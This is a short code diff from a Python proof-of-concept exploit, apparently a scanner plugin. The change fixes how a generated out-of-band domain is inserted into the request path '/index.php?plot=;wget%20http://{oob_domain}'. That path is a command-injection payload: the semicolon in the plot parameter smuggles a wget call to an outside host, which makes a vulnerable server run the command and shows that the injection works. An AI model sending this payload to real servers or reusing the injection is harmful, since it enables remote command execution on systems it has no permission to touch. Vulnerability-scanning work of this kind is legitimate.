@@ -39,7 +39,7 @@ def poc(url):
 
         oob_domain,flag = gen_oob_domain()
 
-        path = """/index.php?plot=;wget%20http://oob_domain"""
+        path = """/index.php?plot=;wget%20http://{oob_domain}""".format(oob_domain=oob_domain)
         method = "GET"
         data = """"""
         headers = {'Accept': '*/*'}
